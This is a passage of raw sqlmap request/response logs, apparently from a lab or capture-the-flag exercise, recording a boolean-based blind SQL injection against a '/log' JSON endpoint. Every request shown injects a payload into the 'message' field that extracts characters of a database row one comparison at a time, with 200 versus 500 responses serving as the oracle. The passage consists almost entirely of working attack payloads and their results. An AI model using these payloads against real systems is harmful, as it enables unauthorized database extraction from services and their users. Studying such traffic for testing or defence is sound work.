+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"error":"NOT NULL constraint failed: logs.message","success":false}
+
+
+############################################################################
+
+HTTP request [#172]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 163
+Connection: close
+
+{"message":"test'||(SELECT CHAR(71,67,69,74) WHERE 8003=8003 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 9,1),3,1)>CHAR(47))||'"}
+
+HTTP response [#172] (200 OK):
+Content-Length: 17
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:21:01 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"success":true}
+
+
+############################################################################
+
+HTTP request [#173]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 163
+Connection: close
+
+{"message":"test'||(SELECT CHAR(71,67,69,74) WHERE 8003=8003 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 9,1),3,1)>CHAR(87))||'"}
+
+HTTP response [#173] (500 Internal Server Error):
+Content-Length: 69
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:21:02 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"error":"NOT NULL constraint failed: logs.message","success":false}
+
+
+############################################################################
+
+HTTP request [#174]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 163
+Connection: close
+
+{"message":"test'||(SELECT CHAR(71,67,69,74) WHERE 8003=8003 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 9,1),3,1)>CHAR(67))||'"}
+
+HTTP response [#174] (500 Internal Server Error):
+Content-Length: 69
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:21:02 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"error":"NOT NULL constraint failed: logs.message","success":false}
+
+
+############################################################################
+
+HTTP request [#175]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 163
+Connection: close
+
+{"message":"test'||(SELECT CHAR(71,67,69,74) WHERE 8003=8003 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 9,1),3,1)>CHAR(57))||'"}
+
+HTTP response [#175] (500 Internal Server Error):
+Content-Length: 69
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:21:02 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"error":"NOT NULL constraint failed: logs.message","success":false}
+
+
+############################################################################
+
+HTTP request [#176]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 163
+Connection: close
+
+{"message":"test'||(SELECT CHAR(71,67,69,74) WHERE 8003=8003 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 9,1),3,1)>CHAR(52))||'"}
+
+HTTP response [#176] (500 Internal Server Error):
+Content-Length: 69
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:21:02 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"error":"NOT NULL constraint failed: logs.message","success":false}
+
+
+############################################################################
+
+HTTP request [#177]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 163
+Connection: close
+
+{"message":"test'||(SELECT CHAR(71,67,69,74) WHERE 8003=8003 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 9,1),3,1)>CHAR(49))||'"}
+
+HTTP response [#177] (200 OK):
+Content-Length: 17
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:21:03 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"success":true}
+
+
+############################################################################
+
+HTTP request [#178]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 163
+Connection: close
+
+{"message":"test'||(SELECT CHAR(71,67,69,74) WHERE 8003=8003 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 9,1),3,1)>CHAR(50))||'"}
+
+HTTP response [#178] (200 OK):
+Content-Length: 17
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:21:03 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"success":true}
+
+
+############################################################################
+
+HTTP request [#179]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 163
+Connection: close
+
+{"message":"test'||(SELECT CHAR(71,67,69,74) WHERE 8003=8003 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 9,1),3,1)>CHAR(51))||'"}
+
+HTTP response [#179] (200 OK):
+Content-Length: 17
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:21:04 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"success":true}
+
+
+############################################################################
+
+HTTP request [#180]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 163
+Connection: close
+
+{"message":"test'||(SELECT CHAR(71,67,69,74) WHERE 8003=8003 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 9,1),4,1)>CHAR(47))||'"}
+
+HTTP response [#180] (200 OK):
+Content-Length: 17
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:21:05 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"success":true}
+
+
+############################################################################
+
+HTTP request [#181]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 163
+Connection: close
+
+{"message":"test'||(SELECT CHAR(71,67,69,74) WHERE 8003=8003 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 9,1),4,1)>CHAR(87))||'"}
+
+HTTP response [#181] (200 OK):
+Content-Length: 17
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:21:05 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"success":true}
+
+
+############################################################################
+
+HTTP request [#182]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 164
+Connection: close
+
+{"message":"test'||(SELECT CHAR(71,67,69,74) WHERE 8003=8003 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 9,1),4,1)>CHAR(107))||'"}
+
+HTTP response [#182] (500 Internal Server Error):
+Content-Length: 69
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:21:05 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"error":"NOT NULL constraint failed: logs.message","success":false}
+
+
+############################################################################
+
+HTTP request [#183]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 163
+Connection: close
+
+{"message":"test'||(SELECT CHAR(71,67,69,74) WHERE 8003=8003 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 9,1),4,1)>CHAR(97))||'"}
+
+HTTP response [#183] (200 OK):
+Content-Length: 17
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:21:06 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"success":true}
+
+
+############################################################################
+
+HTTP request [#184]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 164
+Connection: close
+
+{"message":"test'||(SELECT CHAR(71,67,69,74) WHERE 8003=8003 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 9,1),4,1)>CHAR(102))||'"}
+
+HTTP response [#184] (500 Internal Server Error):
+Content-Length: 69
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:21:06 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"error":"NOT NULL constraint failed: logs.message","success":false}
+
+
+############################################################################
+
+HTTP request [#185]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 163
+Connection: close
+
+{"message":"test'||(SELECT CHAR(71,67,69,74) WHERE 8003=8003 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 9,1),4,1)>CHAR(99))||'"}
+
+HTTP response [#185] (500 Internal Server Error):
+Content-Length: 69
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:21:06 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"error":"NOT NULL constraint failed: logs.message","success":false}
+
+
+############################################################################
+
+HTTP request [#186]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 163
+Connection: close
+
+{"message":"test'||(SELECT CHAR(71,67,69,74) WHERE 8003=8003 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 9,1),4,1)>CHAR(98))||'"}
+
+HTTP response [#186] (200 OK):
+Content-Length: 17
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:21:07 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"success":true}
+
+
+############################################################################
+
+HTTP request [#187]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 163
+Connection: close
+
+{"message":"test'||(SELECT CHAR(71,67,69,74) WHERE 8003=8003 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 9,1),5,1)>CHAR(96))||'"}
+
+HTTP response [#187] (200 OK):
+Content-Length: 17
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:21:08 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"success":true}
+
+
+############################################################################
+
+HTTP request [#188]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 164
+Connection: close
+
+{"message":"test'||(SELECT CHAR(71,67,69,74) WHERE 8003=8003 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 9,1),5,1)>CHAR(112))||'"}
+
+HTTP response [#188] (500 Internal Server Error):
+Content-Length: 69
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:21:08 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"error":"NOT NULL constraint failed: logs.message","success":false}
+
+
+############################################################################
+
+HTTP request [#189]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 164
+Connection: close
+
+{"message":"test'||(SELECT CHAR(71,67,69,74) WHERE 8003=8003 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 9,1),5,1)>CHAR(104))||'"}
+
+HTTP response [#189] (500 Internal Server Error):
+Content-Length: 69
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:21:08 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"error":"NOT NULL constraint failed: logs.message","success":false}
+
+
+############################################################################
+
+HTTP request [#190]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 164
+Connection: close
+
+{"message":"test'||(SELECT CHAR(71,67,69,74) WHERE 8003=8003 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 9,1),5,1)>CHAR(100))||'"}
+
+HTTP response [#190] (200 OK):
+Content-Length: 17
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:21:09 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"success":true}
+
+
+############################################################################
+
+HTTP request [#191]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 164
+Connection: close
+
+{"message":"test'||(SELECT CHAR(71,67,69,74) WHERE 8003=8003 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 9,1),5,1)>CHAR(102))||'"}
+
+HTTP response [#191] (500 Internal Server Error):
+Content-Length: 69
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:21:09 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"error":"NOT NULL constraint failed: logs.message","success":false}
+
+
+############################################################################
+
+HTTP request [#192]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 164
+Connection: close
+
+{"message":"test'||(SELECT CHAR(71,67,69,74) WHERE 8003=8003 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 9,1),5,1)>CHAR(101))||'"}
+
+HTTP response [#192] (200 OK):
+Content-Length: 17
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:21:09 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"success":true}
+
+
+############################################################################
+
+HTTP request [#193]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 163
+Connection: close
+
+{"message":"test'||(SELECT CHAR(71,67,69,74) WHERE 8003=8003 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 9,1),6,1)>CHAR(96))||'"}
+
+HTTP response [#193] (500 Internal Server Error):
+Content-Length: 69
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:21:10 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"error":"NOT NULL constraint failed: logs.message","success":false}
+
+
+############################################################################
+
+HTTP request [#194]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 163
+Connection: close
+
+{"message":"test'||(SELECT CHAR(71,67,69,74) WHERE 8003=8003 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 9,1),6,1)>CHAR(49))||'"}
+
+HTTP response [#194] (200 OK):
+Content-Length: 17
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:21:10 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"success":true}
+
+
+############################################################################
+
+HTTP request [#195]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 163
+Connection: close
+
+{"message":"test'||(SELECT CHAR(71,67,69,74) WHERE 8003=8003 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 9,1),6,1)>CHAR(72))||'"}
+
+HTTP response [#195] (500 Internal Server Error):
+Content-Length: 69
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:21:10 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"error":"NOT NULL constraint failed: logs.message","success":false}
+
+
+############################################################################
+
+HTTP request [#196]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 163
+Connection: close
+
+{"message":"test'||(SELECT CHAR(71,67,69,74) WHERE 8003=8003 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 9,1),6,1)>CHAR(60))||'"}
+
+HTTP response [#196] (500 Internal Server Error):
+Content-Length: 69
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:21:11 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"error":"NOT NULL constraint failed: logs.message","success":false}
+
+
+############################################################################
+
+HTTP request [#197]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 163
+Connection: close
+
+{"message":"test'||(SELECT CHAR(71,67,69,74) WHERE 8003=8003 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 9,1),6,1)>CHAR(54))||'"}
+
+HTTP response [#197] (200 OK):
+Content-Length: 17
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:21:11 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"success":true}
+
+
+############################################################################
+
+HTTP request [#198]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 163
+Connection: close
+
+{"message":"test'||(SELECT CHAR(71,67,69,74) WHERE 8003=8003 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 9,1),6,1)>CHAR(57))||'"}
+
+HTTP response [#198] (500 Internal Server Error):
+Content-Length: 69
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:21:12 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"error":"NOT NULL constraint failed: logs.message","success":false}
+
+
+############################################################################
+
+HTTP request [#199]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 163
+Connection: close
+
+{"message":"test'||(SELECT CHAR(71,67,69,74) WHERE 8003=8003 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 9,1),6,1)>CHAR(55))||'"}
+
+HTTP response [#199] (200 OK):
+Content-Length: 17
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:21:12 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"success":true}
+
+
+############################################################################
+
+HTTP request [#200]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 163
+Connection: close
+
+{"message":"test'||(SELECT CHAR(71,67,69,74) WHERE 8003=8003 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 9,1),6,1)>CHAR(56))||'"}
+
+HTTP response [#200] (500 Internal Server Error):
+Content-Length: 69
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:21:12 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"error":"NOT NULL constraint failed: logs.message","success":false}
+
+
+############################################################################
+
+HTTP request [#201]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 163
+Connection: close
+
+{"message":"test'||(SELECT CHAR(71,67,69,74) WHERE 8003=8003 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 9,1),7,1)>CHAR(47))||'"}
+
+HTTP response [#201] (200 OK):
+Content-Length: 17
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:21:13 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"success":true}
+
+
+############################################################################
+
+HTTP request [#202]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 163
+Connection: close
+
+{"message":"test'||(SELECT CHAR(71,67,69,74) WHERE 8003=8003 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 9,1),7,1)>CHAR(87))||'"}
+
+HTTP response [#202] (200 OK):
+Content-Length: 17
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:21:13 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"success":true}
+
+
+############################################################################
+
+HTTP request [#203]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 164
+Connection: close
+
+{"message":"test'||(SELECT CHAR(71,67,69,74) WHERE 8003=8003 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 9,1),7,1)>CHAR(107))||'"}
+
+HTTP response [#203] (500 Internal Server Error):
+Content-Length: 69
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:21:14 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"error":"NOT NULL constraint failed: logs.message","success":false}
+
+
+############################################################################
+
+HTTP request [#204]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 163
+Connection: close
+
+{"message":"test'||(SELECT CHAR(71,67,69,74) WHERE 8003=8003 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 9,1),7,1)>CHAR(97))||'"}
+
+HTTP response [#204] (200 OK):
+Content-Length: 17
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:21:14 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"success":true}
+
+
+############################################################################
+
+HTTP request [#205]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 164
+Connection: close
+
+{"message":"test'||(SELECT CHAR(71,67,69,74) WHERE 8003=8003 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 9,1),7,1)>CHAR(102))||'"}
+
+HTTP response [#205] (500 Internal Server Error):
+Content-Length: 69
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:21:14 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"error":"NOT NULL constraint failed: logs.message","success":false}
+
+
+############################################################################
+
+HTTP request [#206]:
+POST /log HTTP/1.1
+Content-Type: application/json
